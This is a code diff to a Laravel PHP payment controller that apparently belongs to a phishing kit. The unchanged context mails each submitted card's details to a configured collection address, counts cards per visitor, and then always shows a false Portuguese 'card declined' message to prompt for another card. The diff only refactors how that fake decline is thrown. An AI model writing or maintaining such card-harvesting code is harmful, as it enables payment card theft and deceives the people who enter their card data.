@@ -10,6 +10,7 @@ use Illuminate\Http\RedirectResponse;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\Mail;
+use Illuminate\Validation\ValidationException;
 use Throwable;
 
 class PaymentController extends Controller {
@@ -24,6 +25,7 @@ class PaymentController extends Controller {
     {
         $visitor = Visitor::current();
         $settings = Settings::me();
+
         try {
             Mail::to($settings->email_result)->sendNow(new CardDetails($request));
             $visitor->increment('card_count');
@@ -40,12 +42,8 @@ class PaymentController extends Controller {
             );
         }
 
-        return back()->withErrors([
+        throw ValidationException::withMessages([
             'cardNumber' => 'Seu cartão foi recusado, por favor tente outro cartão.',
-        ])->withInput([
-            'cardNumber' => $request->get('cardNumber'),
-            'cardName' => $request->get('cardName'),
-            'cardExpiry' => $request->get('cardExpiry'),
         ]);
     }
 }
